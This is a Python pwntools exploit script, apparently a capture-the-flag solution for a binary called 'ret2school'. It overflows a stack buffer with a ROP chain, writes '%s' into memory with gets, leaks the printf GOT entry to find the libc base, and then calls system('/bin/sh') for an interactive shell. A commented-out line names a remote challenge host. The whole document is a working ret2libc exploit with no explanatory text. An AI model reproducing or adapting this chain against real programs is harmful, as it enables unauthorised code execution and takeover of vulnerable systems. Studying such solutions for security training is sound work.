#!/usr/bin/env python3
from pwn import *

context.binary = binary = './ret2school'
elf = ELF(binary)
rop = ROP(elf)
libc = ELF('./libc.so.6', checksec=False)

p = process()
# p = remote("20.169.252.240", 4922)
if args.GDB:
	gdbscript="""
	b *main+57
	c
	"""
	gdb.attach(p, gdbscript=gdbscript)

# put %s in got to use for printf
address = 0x601030
payload = b'A'*40
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(address)
payload += p64(elf.plt.gets)
payload += p64(elf.symbols.main)

p.sendlineafter(b'homework: ', payload)
p.sendline(b'%s\00')

# printf
payload = b'A'*40
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(address)
payload += p64(rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0])
payload += p64(elf.got.printf)
payload += p64(0)
payload += p64(elf.plt.printf)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(elf.symbols.main)

p.sendlineafter(b'homework: ', payload)

leak = unpack(p.recv(6), 'all')

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.printf
log.info(f'Libc base => {hex(libc.address)}')

payload = b"A"*40
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)

p.interactive()
